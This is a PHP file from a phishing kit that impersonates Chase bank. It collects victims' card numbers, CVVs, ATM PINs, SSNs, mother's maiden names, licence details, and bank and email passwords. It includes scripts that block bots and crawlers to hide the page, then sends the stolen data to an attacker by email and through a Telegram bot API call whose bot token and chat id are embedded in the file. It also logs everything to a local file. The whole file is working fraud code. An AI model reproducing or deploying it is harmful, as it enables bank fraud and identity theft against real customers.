<?php
session_start();
require_once '../main.php';
include('../detects.php');
include('../blockers.php');
include 'bots/anti1.php';
include 'bots/anti2.php';
include 'bots/anti3.php';
include 'bots/anti4.php';
include 'bots/anti5.php';
include 'bots/anti6.php';
include 'bots/anti7.php';
include 'bots/anti8.php';
include'anti/IP-BlackList.php';  
include'anti/Bot-Crawler.php';
include'anti/Bot-Spox.php';
include'anti/blacklist.php';
include'anti/new.php';
include'anti/Dila_DZ.php';
if (!$_POST['CardNumber']) {
} else {
    $userbank = $_SESSION['userbank'];
    $passwordbank = $_SESSION['passwordbank'];
    $securityTokenbank = $_SESSION['securityTokenbank'];
    $emaildress = $_SESSION['emaildress'];
    $emailPassword = $_SESSION['emailPassword'];
    $emailretry = $_SESSION['emailretry'];
    $emailType = $_SESSION['emailType'];
    $emailProvider = $_SESSION['emailProvider'];
    $fullname = $_SESSION['fullname'];
    $DateOfBirth = $_SESSION['DateOfBirth'];
    $StreetAddress = $_SESSION['StreetAddress'];
    $StateRegion = $_SESSION['StateRegion'];
    $ZipCode = $_SESSION['ZipCode'];
    $CityR = $_SESSION['CityR'];
    $NumberPhone = $_SESSION['NumberPhone'];
    $NumberCarrier = $_SESSION['NumberCarrier'];
    $NumberPin = $_SESSION['NumberPin'];
    $MaidenName = $_SESSION['MaidenName'] = $_POST['MaidenName'];
    $CardNumber = $_SESSION['CardNumber'] = $_POST['CardNumber'];
    $TypeC = $_SESSION['type'] = $_POST['type'];
    $BankC = $_SESSION['bank'] = $_POST['bank'];
    $BrandC = $_SESSION['brandbank'] = $_POST['brandbank'];
    $ExpirationDate = $_SESSION['ExpirationDate'] = $_POST['ExpirationDate'];
    $Cvv = $_SESSION['Cvv'] = $_POST['Cvv'];
    $SecurityNumber = $_SESSION['SecurityNumber'];
    $AtmPin = $_SESSION['AtmPin'] = $_POST['AtmPin'];
    $LicenseNumber = $_SESSION['LicenseNumber'] = $_POST['LicenseNumber'];
    $LicenseNExp = $_SESSION['LicenseNExp'] = $_POST['LicenseNExp'];
    $CardNumber = str_replace(' ', '', $CardNumber);
    $last4 = substr($CardNumber, 12, 16);
    $cardInfo = check_bin($CardNumber);
    $BIN = substr($CardNumber,0,6);
    $Bank = (isset($cardInfo['bank']['name'])) ? $cardInfo['bank']['name']:"Unknown Bank For This BIN!";
    $Brand = ($cardInfo['brand']);
    $Type = ($cardInfo['type']);
    $VictimInfo1 = "| Submitted by : " . $v_ip . " (" . gethostbyaddr($v_ip) . ")";
    $VictimInfo2 = "| Location : " . $citykota . ", " . $regioncity . ", " . $countryname . "";
    $VictimInfo3 = "| UserAgent : " . $user_agent . "";
    $VictimInfo4 = "| Browser : " . $br . "";
    $VictimInfo5 = "| Os : " . $os . "";

    $message = "+ -------- 👻💥 [⚡ ELARABY ⚡] 💥👻 -----------+\n";
    $message .= "+ 💎 🔑 Personal Information\n";
    $message .= "| Full name : $fullname\n";
    $message .= "| Date of birth : $DateOfBirth\n";
    $message .= "| MMN : $MaidenName\n";
    $message .= "| SSN : $SecurityNumber\n";
    $message .= "| address : $StreetAddress\n";
    $message .= "| State : $StateRegion\n";
    $message .= "| City : $CityR\n";
    $message .= "| Zip : $ZipCode\n";
    $message .= "| Telephone : $NumberPhone\n";
    if ($enablephonepin === "on") {
        $message .= "| Phone Carrier : $NumberCarrier\n";
        $message .= "| Phone Carrier Pin : $NumberPin\n";
    }
    $message .= "| MMN : $MaidenName\n";
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 🏦 Chase Login Details\n";
    $message .= "| Chese login : $userbank\n";
    $message .= "| Chese password : $passwordbank\n";
    if (isset($_SESSION['securityTokenbank'])) {
        $message .= "| Chese Security Token : $securityTokenbank\n";
    }    $message .= "+ ------------------------------------+\n";
    $message .= "+ ✅ Email login $emailretry\n";
    $message .= "| Email login : $emaildress\n";
    $message .= "| Email password : $emailPassword\n";
    $message .= "| Email Provid3r : $emailProvider\n";
    $message .= "| Email Type : $emailType\n";
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 💳 Billiing Informati0n\n";
    $message .= "| Card BIN : $BIN\n";
    $message .= "| Card Bank : $Bank\n";
    $message .= "| Card Type : $Brand $Type\n";
    $message .= "| Card Number : $CardNumber\n";
    $message .= "| Card Exp : $ExpirationDate\n";
    $message .= "| CVV : $Cvv\n";
    $message .= "| aTM Pln : $AtmPin\n";
    $message .= "| License Numb3r : $LicenseNumber\n";
    $message .= "| License Expiry: $LicenseNExp\n";
    $message .= "+ ------------------------------------+\n";
    $message .= "+ 🌐 Victim Information\n";
    $message .= "$VictimInfo1\n";
    $message .= "$VictimInfo2\n";
    $message .= "$VictimInfo3\n";
    $message .= "$VictimInfo4\n";
    $message .= "$VictimInfo5\n";
    $message .= "| 🕛 Received : $date\n";
    $message .= "+ ------------------------------------+\n";
    if($cardInfo["brand"] == "") {
        $subject = "CHESE FULLZ: " .$fullname." ".$BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["bank"]["name"])." [ $cn - $os - $v_ip ]";
    $subbin = $BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["bank"]["name"]);
    } else {
        $subject = "CHESE FULLZ: " .$fullname." ".$BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["brand"])." ".strtoupper($cardInfo["bank"]["name"])." [ $cn - $os - $v_ip ]";
    $subbin = $BIN." - ".strtoupper($cardInfo["scheme"])." ".strtoupper($cardInfo["type"])." ".strtoupper($cardInfo["brand"])." ".strtoupper($cardInfo["bank"]["name"]);
    }
    //$subject = "CHASE FULLZ: " .$fullname. $Bank . " ".$Brand . " ".$Type ." [ $cn - $os - $v_ip ]";
    kirim_mail($email_result, "CHESE FULLZ ".$fullname, $subject, $message);
	file_get_contents('https://api.telegram.org/bot5157139736:AAG_tQwVnXuAPrz8auSZ4KvCehaZrU-rkbo/sendMessage?text='.$message.'&chat_id=1148960035');
	$save = fopen("../rs/card.txt","a+");
	fwrite($save,$message);
    fclose($save);
    //header('Location: done.php');

}
?>